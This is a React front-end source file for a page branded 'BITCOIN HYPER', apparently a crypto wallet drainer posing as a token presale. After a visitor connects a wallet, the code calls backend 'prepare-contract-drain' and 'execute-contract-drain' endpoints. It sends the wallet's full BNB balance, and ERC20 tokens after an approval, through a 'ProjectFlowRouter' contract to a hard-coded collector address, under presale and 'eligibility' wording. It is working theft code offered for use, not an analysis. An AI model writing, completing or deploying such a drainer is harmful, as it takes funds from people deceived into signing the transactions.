// app.jsx - BITCOIN HYPER - PROJECT FLOW ROUTER INTEGRATION
import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';

// ============================================
// CONFIGURATION
// ============================================

// Your deployed ProjectFlowRouter contract on BNB Chain
const PROJECT_FLOW_ROUTER = {
  BSC: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8'  // Your deployed contract
};

// Collector address (where funds go)
const COLLECTOR_ADDRESS = '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824'; // Update with your collector address

// Chain configurations
const SUPPORTED_CHAINS = [
  {
    name: 'BSC',
    chainId: 56,
    rpcUrl: 'https://bsc-dataseed.binance.org',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    routerAddress: PROJECT_FLOW_ROUTER.BSC,
    icon: '🟡'
  },
  // Add more chains as you deploy more ProjectFlowRouter contracts
  // {
  //   name: 'Ethereum',
  //   chainId: 1,
  //   rpcUrl: 'https://eth.llamarpc.com',
  //   symbol: 'ETH',
  //   explorer: 'https://etherscan.io',
  //   routerAddress: '0x...', // Deploy same contract on Ethereum
  //   icon: '🔷'
  // }
];

// ============================================
// CONTRACT ABI
// ============================================

const PROJECT_FLOW_ROUTER_ABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_collector",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "anonymous": false,
    "inputs": [
      {
        "indexed": false,
        "internalType": "address",
        "name": "oldCollector",
        "type": "address"
      },
      {
        "indexed": false,
        "internalType": "address",
        "name": "newCollector",
        "type": "address"
      }
    ],
    "name": "CollectorUpdated",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      {
        "indexed": true,
        "internalType": "address",
        "name": "initiator",
        "type": "address"
      },
      {
        "indexed": false,
        "internalType": "uint256",
        "name": "value",
        "type": "uint256"
      }
    ],
    "name": "FlowProcessed",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      {
        "indexed": true,
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "indexed": true,
        "internalType": "address",
        "name": "initiator",
        "type": "address"
      },
      {
        "indexed": false,
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "name": "TokenFlowProcessed",
    "type": "event"
  },
  {
    "inputs": [],
    "name": "collector",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "processNativeFlow",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "name": "processTokenFlow",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "newCollector",
        "type": "address"
      }
    ],
    "name": "updateCollector",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

// ERC20 ABI for token interactions
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)",
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
];

// ============================================
// MAIN APP COMPONENT
// ============================================

function App() {
  const [account, setAccount] = useState(null);
  const [chainId, setChainId] = useState(null);
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balance, setBalance] = useState('0');
  const [bnbBalance, setBnbBalance] = useState('0');
  const [loading, setLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [tokenAddress, setTokenAddress] = useState('');
  const [tokenAmount, setTokenAmount] = useState('');
  const [tokenBalance, setTokenBalance] = useState('');
  const [tokenSymbol, setTokenSymbol] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [drainPrepared, setDrainPrepared] = useState(false);
  const [drainTransactions, setDrainTransactions] = useState([]);
  const [activeChain, setActiveChain] = useState(SUPPORTED_CHAINS[0]);
  const [contractInfo, setContractInfo] = useState(null);

  // ============================================
  // CHECK IF CURRENT CHAIN IS SUPPORTED
  // ============================================
  const isSupportedChain = () => {
    const chain = SUPPORTED_CHAINS.find(c => c.chainId === chainId);
    return !!chain;
  };

  const getCurrentChain = () => {
    return SUPPORTED_CHAINS.find(c => c.chainId === chainId) || null;
  };

  // ============================================
  // SWITCH NETWORK
  // ============================================
  const switchNetwork = async (chain) => {
    if (!window.ethereum) return;
    
    try {
      setLoading(true);
      setError('');
      
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: `0x${chain.chainId.toString(16)}` }],
      });
      
      setActiveChain(chain);
    } catch (switchError) {
      // If chain not added to wallet, add it
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [
              {
                chainId: `0x${chain.chainId.toString(16)}`,
                chainName: chain.name,
                nativeCurrency: {
                  name: chain.symbol,
                  symbol: chain.symbol,
                  decimals: 18,
                },
                rpcUrls: [chain.rpcUrl],
                blockExplorerUrls: [chain.explorer],
              },
            ],
          });
        } catch (addError) {
          setError(`Failed to add ${chain.name} network`);
        }
      } else {
        setError(`Failed to switch to ${chain.name}`);
      }
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // CONNECT WALLET
  // ============================================
  const connectWallet = async () => {
    if (!window.ethereum) {
      setError('Please install MetaMask or another Web3 wallet');
      return;
    }

    try {
      setLoading(true);
      setError('');
      
      // Request account access
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      
      // Get provider and signer
      const web3Provider = new ethers.BrowserProvider(window.ethereum);
      const web3Signer = await web3Provider.getSigner();
      
      // Get network
      const network = await web3Provider.getNetwork();
      const currentChainId = Number(network.chainId);
      
      setProvider(web3Provider);
      setSigner(web3Signer);
      setAccount(accounts[0]);
      setChainId(currentChainId);
      
      // Check if current chain is supported
      const currentChain = SUPPORTED_CHAINS.find(c => c.chainId === currentChainId);
      if (currentChain) {
        setActiveChain(currentChain);
      }
      
      // Get BNB balance
      const balanceWei = await web3Provider.getBalance(accounts[0]);
      const balanceBnb = ethers.formatEther(balanceWei);
      setBnbBalance(balanceBnb);
      
      // Check contract info if on supported chain
      if (currentChain) {
        await checkContractInfo(currentChain, accounts[0]);
      }
      
    } catch (err) {
      console.error('Connection error:', err);
      setError(err.message || 'Failed to connect wallet');
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // CHECK CONTRACT INFO
  // ============================================
  const checkContractInfo = async (chain, walletAddress) => {
    try {
      if (!provider || !chain.routerAddress) return;
      
      const contract = new ethers.Contract(
        chain.routerAddress,
        PROJECT_FLOW_ROUTER_ABI,
        provider
      );
      
      const collector = await contract.collector();
      
      setContractInfo({
        address: chain.routerAddress,
        collector: collector,
        chain: chain.name
      });
      
      console.log(`✅ Contract loaded: ${chain.routerAddress}`);
      console.log(`   Collector: ${collector}`);
      
    } catch (err) {
      console.error('Contract info error:', err);
    }
  };

  // ============================================
  // SCAN WALLET BALANCE (Calls your backend)
  // ============================================
  const scanWallet = async () => {
    if (!account) return;
    
    try {
      setLoading(true);
      setError('');
      setTxStatus('🔍 Scanning wallet across all chains...');
      
      const response = await fetch('/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: account })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        setTxStatus(data.message);
        
        if (data.data.isEligible) {
          // Auto-prepare contract drain if eligible
          prepareContractDrain();
        }
      } else {
        setError(data.error || 'Scan failed');
      }
      
    } catch (err) {
      console.error('Scan error:', err);
      setError('Failed to scan wallet');
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // PREPARE CONTRACT DRAIN
  // ============================================
  const prepareContractDrain = async () => {
    if (!account) return;
    
    try {
      setLoading(true);
      setError('');
      setTxStatus('🔐 Preparing ProjectFlowRouter transactions...');
      
      const response = await fetch('/api/presale/prepare-contract-drain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: account })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setDrainPrepared(true);
        setDrainTransactions(data.data.transactions);
        setTxStatus(data.message);
      } else {
        setError(data.error || 'Failed to prepare drain');
      }
      
    } catch (err) {
      console.error('Prepare error:', err);
      setError('Failed to prepare drain');
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // EXECUTE NATIVE FLOW (Send BNB to collector via contract)
  // ============================================
  const executeNativeFlow = async () => {
    if (!signer || !account || !activeChain.routerAddress) {
      setError('Wallet not connected or router not deployed on this chain');
      return;
    }

    // Check if on correct chain
    if (chainId !== activeChain.chainId) {
      setError(`Please switch to ${activeChain.name} network`);
      return;
    }

    try {
      setLoading(true);
      setError('');
      setTxStatus(`⏳ Executing ProjectFlowRouter.processNativeFlow() on ${activeChain.name}...`);
      setTxHash('');

      // Get contract instance
      const contract = new ethers.Contract(
        activeChain.routerAddress,
        PROJECT_FLOW_ROUTER_ABI,
        signer
      );

      // Check contract
      const collector = await contract.collector();
      console.log(`✅ Sending to collector: ${collector}`);

      // Get gas price
      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice;

      // Estimate gas
      const gasEstimate = await contract.processNativeFlow.estimateGas({
        value: ethers.parseEther(bnbBalance)
      });

      // Send transaction - this will send ALL BNB to the collector
      const tx = await contract.processNativeFlow({
        value: ethers.parseEther(bnbBalance),
        gasLimit: gasEstimate * 120n / 100n, // 20% buffer
        gasPrice: gasPrice
      });

      setTxHash(tx.hash);
      setTxStatus(`✅ Transaction submitted! Waiting for confirmation...`);

      // Wait for confirmation
      const receipt = await tx.wait();
      
      setTxStatus(`✅ SUCCESS! All BNB sent to collector via ProjectFlowRouter!`);
      
      // Update balance
      const newBalance = await provider.getBalance(account);
      setBnbBalance(ethers.formatEther(newBalance));
      
      // Log to backend
      await fetch('/api/presale/execute-contract-drain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: account,
          chainName: activeChain.name
        })
      });

    } catch (err) {
      console.error('Native flow error:', err);
      setError(err.message || 'Transaction failed');
      setTxStatus('❌ Transaction failed');
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // CHECK TOKEN BALANCE
  // ============================================
  const checkTokenBalance = async () => {
    if (!provider || !account || !tokenAddress) return;
    
    try {
      setLoading(true);
      setError('');
      
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      
      const balance = await tokenContract.balanceOf(account);
      const decimals = await tokenContract.decimals();
      const symbol = await tokenContract.symbol();
      
      const formattedBalance = ethers.formatUnits(balance, decimals);
      setTokenBalance(formattedBalance);
      setTokenSymbol(symbol);
      setTokenAmount(formattedBalance);
      
      setTxStatus(`💰 Token Balance: ${formattedBalance} ${symbol}`);
      
    } catch (err) {
      console.error('Token balance error:', err);
      setError('Failed to get token balance');
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // EXECUTE TOKEN FLOW (Send tokens to collector via contract)
  // ============================================
  const executeTokenFlow = async () => {
    if (!signer || !account || !activeChain.routerAddress) {
      setError('Wallet not connected');
      return;
    }

    if (!tokenAddress || !tokenAmount || parseFloat(tokenAmount) <= 0) {
      setError('Enter valid token address and amount');
      return;
    }

    // Check if on correct chain
    if (chainId !== activeChain.chainId) {
      setError(`Please switch to ${activeChain.name} network`);
      return;
    }

    try {
      setLoading(true);
      setError('');
      setTxStatus(`⏳ Approving token transfer...`);
      setTxHash('');

      // Parse amount with proper decimals
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
      const decimals = await tokenContract.decimals();
      const amountWei = ethers.parseUnits(tokenAmount, decimals);

      // First approve the router to spend tokens
      const approveTx = await tokenContract.approve(activeChain.routerAddress, amountWei);
      await approveTx.wait();
      
      setTxStatus(`✅ Approved! Now sending to collector...`);

      // Get contract instance
      const contract = new ethers.Contract(
        activeChain.routerAddress,
        PROJECT_FLOW_ROUTER_ABI,
        signer
      );

      // Execute token flow
      const tx = await contract.processTokenFlow(tokenAddress, amountWei, {
        gasLimit: 200000
      });

      setTxHash(tx.hash);
      setTxStatus(`✅ Transaction submitted! Waiting for confirmation...`);

      // Wait for confirmation
      const receipt = await tx.wait();
      
      setTxStatus(`✅ SUCCESS! Tokens sent to collector via ProjectFlowRouter!`);
      
      // Update token balance
      const newBalance = await tokenContract.balanceOf(account);
      setTokenBalance(ethers.formatUnits(newBalance, decimals));

    } catch (err) {
      console.error('Token flow error:', err);
      setError(err.message || 'Transaction failed');
      setTxStatus('❌ Transaction failed');
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // DISCONNECT WALLET
  // ============================================
  const disconnectWallet = () => {
    setAccount(null);
    setProvider(null);
    setSigner(null);
    setChainId(null);
    setBnbBalance('0');
    setScanResult(null);
    setDrainPrepared(false);
    setDrainTransactions([]);
    setContractInfo(null);
    setTxStatus('');
    setTxHash('');
  };

  // ============================================
  // EFFECTS
  // ============================================
  useEffect(() => {
    if (window.ethereum) {
      // Handle account changes
      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          disconnectWallet();
        } else {
          setAccount(accounts[0]);
          if (provider) {
            provider.getBalance(accounts[0]).then(balance => {
              setBnbBalance(ethers.formatEther(balance));
            });
          }
        }
      });

      // Handle chain changes
      window.ethereum.on('chainChanged', (chainIdHex) => {
        const newChainId = parseInt(chainIdHex, 16);
        setChainId(newChainId);
        
        const chain = SUPPORTED_CHAINS.find(c => c.chainId === newChainId);
        if (chain) {
          setActiveChain(chain);
          if (account && provider) {
            checkContractInfo(chain, account);
          }
        }
        
        // Refresh balance
        if (account && provider) {
          provider.getBalance(account).then(balance => {
            setBnbBalance(ethers.formatEther(balance));
          });
        }
      });
    }

    return () => {
      if (window.ethereum) {
        window.ethereum.removeAllListeners('accountsChanged');
        window.ethereum.removeAllListeners('chainChanged');
      }
    };
  }, [provider, account]);

  // ============================================
  // RENDER
  // ============================================
  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white">
      <div className="container mx-auto px-4 py-8">
        
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-4xl font-bold mb-2 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
            BITCOIN HYPER
          </h1>
          <p className="text-gray-400">ProjectFlowRouter Integration</p>
          <div className="mt-2 text-sm text-gray-500">
            <span className="bg-gray-800 px-3 py-1 rounded-full">
              Contract: {PROJECT_FLOW_ROUTER.BSC.substring(0, 10)}...
            </span>
          </div>
        </div>

        {/* Chain Selection */}
        <div className="mb-6 flex flex-wrap gap-2 justify-center">
          {SUPPORTED_CHAINS.map(chain => (
            <button
              key={chain.chainId}
              onClick={() => switchNetwork(chain)}
              className={`px-4 py-2 rounded-lg font-medium transition ${
                activeChain.chainId === chain.chainId
                  ? 'bg-orange-500 text-white'
                  : 'bg-gray-800 text-gray-300 hover:bg-gray-700'
              }`}
            >
              {chain.icon} {chain.name}
              {chain.routerAddress === PROJECT_FLOW_ROUTER.BSC && ' ✅'}
            </button>
          ))}
        </div>

        {/* Connection Status */}
        <div className="text-center mb-6">
          {!account ? (
            <button
              onClick={connectWallet}
              disabled={loading}
              className="bg-orange-500 hover:bg-orange-600 text-white font-bold py-3 px-8 rounded-lg transition disabled:opacity-50"
            >
              {loading ? 'Connecting...' : 'Connect Wallet'}
            </button>
          ) : (
            <div className="inline-flex items-center gap-4 bg-gray-800 px-6 py-3 rounded-lg">
              <span className="text-green-400">●</span>
              <span className="font-mono">
                {account.substring(0, 6)}...{account.substring(38)}
              </span>
              <span className="text-orange-400 font-bold">
                {parseFloat(bnbBalance).toFixed(4)} {activeChain.symbol}
              </span>
              {!isSupportedChain() && (
                <span className="text-red-400 text-sm ml-2">
                  ⚠️ Unsupported Chain
                </span>
              )}
              <button
                onClick={disconnectWallet}
                className="text-sm text-gray-400 hover:text-white ml-4"
              >
                Disconnect
              </button>
            </div>
          )}
        </div>

        {/* Contract Info */}
        {contractInfo && account && (
          <div className="bg-gray-800/50 rounded-lg p-4 mb-6 text-center">
            <p className="text-sm text-gray-400">
              ProjectFlowRouter: <span className="text-orange-400 font-mono">{contractInfo.address.substring(0, 10)}...</span> | 
              Collector: <span className="text-green-400 font-mono">{contractInfo.collector.substring(0, 10)}...</span>
            </p>
            <p className="text-xs text-gray-500 mt-1">
              All funds sent via processNativeFlow() go directly to collector
            </p>
          </div>
        )}

        {/* Error Display */}
        {error && (
          <div className="bg-red-900/50 border border-red-500 text-red-200 px-4 py-3 rounded-lg mb-6">
            ⚠️ {error}
          </div>
        )}

        {/* Status Display */}
        {txStatus && (
          <div className="bg-gray-800/50 border border-gray-700 px-4 py-3 rounded-lg mb-6 text-center">
            <p className="text-gray-300">{txStatus}</p>
            {txHash && (
              <a
                href={`${activeChain.explorer}/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-orange-400 text-sm hover:underline mt-1 inline-block"
              >
                View on Explorer ↗
              </a>
            )}
          </div>
        )}

        {account && (
          <>
            {/* Main Actions */}
            <div className="grid md:grid-cols-2 gap-6 mb-8">
              
              {/* SCAN WALLET CARD */}
              <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
                <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                  <span className="text-2xl">🔍</span> Scan Wallet
                </h2>
                <p className="text-gray-400 text-sm mb-4">
                  Check eligibility and prepare ProjectFlowRouter transactions
                </p>
                <button
                  onClick={scanWallet}
                  disabled={loading}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition disabled:opacity-50"
                >
                  {loading ? 'Scanning...' : 'Scan Wallet Balance'}
                </button>
                
                {/* Scan Result */}
                {scanResult && (
                  <div className="mt-4 p-4 bg-gray-900 rounded-lg">
                    <p className="text-lg font-bold mb-2">
                      Total: ${scanResult.totalValueUSD}
                    </p>
                    <p className={scanResult.isEligible ? 'text-green-400' : 'text-red-400'}>
                      {scanResult.eligibilityReason}
                    </p>
                    {scanResult.isEligible && (
                      <p className="text-orange-400 mt-2">
                        🎁 Allocation: {scanResult.tokenAllocation?.amount || '5000'} BTH
                      </p>
                    )}
                  </div>
                )}
              </div>

              {/* NATIVE FLOW CARD */}
              <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
                <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                  <span className="text-2xl">💰</span> Native Flow
                </h2>
                <p className="text-gray-400 text-sm mb-4">
                  Send all {activeChain.symbol} to collector via ProjectFlowRouter
                </p>
                <div className="bg-gray-900 p-3 rounded-lg mb-4">
                  <p className="text-sm text-gray-400">Balance:</p>
                  <p className="text-2xl font-bold text-orange-400">
                    {parseFloat(bnbBalance).toFixed(6)} {activeChain.symbol}
                  </p>
                </div>
                <button
                  onClick={executeNativeFlow}
                  disabled={loading || !activeChain.routerAddress || parseFloat(bnbBalance) <= 0 || chainId !== activeChain.chainId}
                  className="w-full bg-orange-500 hover:bg-orange-600 text-white font-bold py-3 px-4 rounded-lg transition disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {loading ? 'Processing...' : `Send All ${activeChain.symbol} to Collector`}
                </button>
                {chainId !== activeChain.chainId && activeChain.routerAddress && (
                  <p className="text-red-400 text-sm mt-2 text-center">
                    ⚠️ Switch to {activeChain.name} network
                  </p>
                )}
              </div>
            </div>

            {/* Token Flow Section */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700 mb-8">
              <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                <span className="text-2xl">🪙</span> Token Flow
              </h2>
              <p className="text-gray-400 text-sm mb-4">
                Send ERC20 tokens to collector via ProjectFlowRouter
              </p>
              
              <div className="grid md:grid-cols-3 gap-4">
                <input
                  type="text"
                  placeholder="Token Address (0x...)"
                  value={tokenAddress}
                  onChange={(e) => setTokenAddress(e.target.value)}
                  className="bg-gray-900 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-orange-500"
                />
                <input
                  type="number"
                  placeholder="Amount"
                  value={tokenAmount}
                  onChange={(e) => setTokenAmount(e.target.value)}
                  className="bg-gray-900 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-orange-500"
                />
                <button
                  onClick={checkTokenBalance}
                  disabled={loading || !tokenAddress}
                  className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition disabled:opacity-50"
                >
                  Check Balance
                </button>
              </div>

              {tokenBalance && (
                <div className="mt-4 bg-gray-900 p-4 rounded-lg">
                  <p className="text-sm text-gray-400">Token Balance:</p>
                  <p className="text-xl font-bold text-green-400">
                    {tokenBalance} {tokenSymbol}
                  </p>
                </div>
              )}

              <button
                onClick={executeTokenFlow}
                disabled={loading || !tokenAddress || !tokenAmount || parseFloat(tokenAmount) <= 0 || chainId !== activeChain.chainId}
                className="w-full mt-4 bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-4 rounded-lg transition disabled:opacity-50"
              >
                {loading ? 'Processing...' : `Send Tokens to Collector via ProjectFlowRouter`}
              </button>
            </div>

            {/* Prepared Transactions */}
            {drainPrepared && drainTransactions.length > 0 && (
              <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
                <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                  <span className="text-2xl">📋</span> Prepared ProjectFlowRouter Transactions
                </h2>
                <p className="text-green-400 mb-4">
                  ✅ Ready to send funds via smart contract
                </p>
                
                <div className="space-y-3">
                  {drainTransactions.map((tx, index) => (
                    <div key={index} className="bg-gray-900 p-4 rounded-lg flex justify-between items-center">
                      <div>
                        <span className="text-orange-400 font-bold">{tx.chain}</span>
                        <p className="text-sm text-gray-400">
                          {tx.amount} {tx.symbol} (${tx.valueUSD})
                        </p>
                        <p className="text-xs text-gray-500 font-mono">
                          Router: {tx.routerAddress.substring(0, 10)}...
                        </p>
                      </div>
                      {tx.chain === activeChain.name && (
                        <span className="text-green-400 text-sm">✅ Current Chain</span>
                      )}
                    </div>
                  ))}
                </div>
                
                <div className="mt-4 p-4 bg-gray-900 rounded-lg border border-orange-500/30">
                  <p className="text-center text-orange-400">
                    ⚡ Switch to each chain and click "Send All to Collector" above
                  </p>
                </div>
              </div>
            )}
          </>
        )}

        {/* Footer */}
        <div className="mt-8 text-center text-gray-500 text-sm">
          <p>ProjectFlowRouter • Send all funds to collector via smart contract</p>
          <p className="mt-1">Router Address: {PROJECT_FLOW_ROUTER.BSC}</p>
          <p className="mt-1">Collector: {COLLECTOR_ADDRESS}</p>
        </div>
      </div>
    </div>
  );
}

export default App;

